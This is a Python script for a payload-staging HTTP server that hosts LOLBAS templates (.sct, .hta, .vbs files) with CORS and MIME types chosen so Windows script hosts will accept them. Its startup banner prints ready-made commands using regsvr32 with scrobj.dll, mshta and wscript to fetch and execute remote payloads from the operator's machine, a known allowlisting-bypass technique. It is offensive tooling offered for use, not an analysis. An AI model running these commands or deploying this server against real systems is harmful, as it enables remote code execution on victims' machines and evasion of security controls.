#!/usr/bin/env python3
"""
LOLBAS Template HTTP Server
Serves LOLBAS payload templates with proper MIME types and CORS headers
"""

import http.server
import socketserver
import os
import sys
from pathlib import Path


class LolbasHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP request handler with proper MIME types and CORS"""
    
    def end_headers(self):
        """Add CORS headers for cross-origin requests"""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
        super().end_headers()
    
    def guess_type(self, path):
        """Set proper MIME types for LOLBAS files"""
        mime_types = {
            '.vbs': 'text/vbscript',
            '.sct': 'text/scriptlet',
            '.hta': 'application/hta',
            '.xml': 'text/xml',
            '.ps1': 'text/plain',
            '.py': 'text/plain',
        }
        
        ext = Path(path).suffix.lower()
        if ext in mime_types:
            return mime_types[ext]
        
        return super().guess_type(path)
    
    def log_message(self, format, *args):
        """Custom log format with colors"""
        timestamp = self.log_date_time_string()
        message = format % args
        
        # Color codes
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RESET = '\033[0m'
        
        if '200' in message:
            color = GREEN
        else:
            color = YELLOW
        
        print(f"{color}[{timestamp}] {message}{RESET}")


def run_server(port=8080, directory='lolbas_templates'):
    """
    Run HTTP server for LOLBAS templates
    
    Args:
        port: Port to listen on (default: 8080)
        directory: Directory to serve (default: lolbas_templates)
    """
    
    # Change to template directory
    if os.path.exists(directory):
        os.chdir(directory)
        print(f"[*] Serving files from: {os.getcwd()}")
    else:
        print(f"[!] Directory '{directory}' not found. Creating it...")
        os.makedirs(directory, exist_ok=True)
        os.chdir(directory)
    
    # Get server IP
    import socket
    hostname = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = '127.0.0.1'
    
    # Start server
    with socketserver.TCPServer(("0.0.0.0", port), LolbasHTTPRequestHandler) as httpd:
        print("\n" + "="*60)
        print("  LOLBAS Template HTTP Server")
        print("="*60)
        print(f"\n  Server running on port {port}")
        print("\n  Local URLs:")
        print(f"    http://localhost:{port}/")
        print(f"    http://{local_ip}:{port}/")
        print("\n  Available files:")
        
        # List available files
        for file in Path('.').glob('*'):
            if file.is_file():
                print(f"    - {file.name}")
                print(f"      URL: http://{local_ip}:{port}/{file.name}")
        
        print("\n  Example LOLBAS commands:")
        print(f"    regsvr32.exe /s /n /u /i:http://{local_ip}:{port}/payload.sct scrobj.dll")
        print(f"    mshta.exe http://{local_ip}:{port}/payload.hta")
        print(f"    wscript.exe http://{local_ip}:{port}/payload.vbs")
        
        print("\n" + "="*60)
        print("  Press Ctrl+C to stop the server")
        print("="*60 + "\n")
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped by user")
            sys.exit(0)


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='LOLBAS Template HTTP Server')
    parser.add_argument('-p', '--port', type=int, default=8080, 
                        help='Port to listen on (default: 8080)')
    parser.add_argument('-d', '--directory', type=str, default='lolbas_templates',
                        help='Directory to serve (default: lolbas_templates)')
    
    args = parser.parse_args()
    
    try:
        run_server(port=args.port, directory=args.directory)
    except PermissionError:
        print(f"\n[!] Permission denied. Try using a port > 1024 or run with sudo")
        sys.exit(1)
    except OSError as e:
        print(f"\n[!] Error: {e}")
        print(f"[*] Port {args.port} may already be in use")
        sys.exit(1)
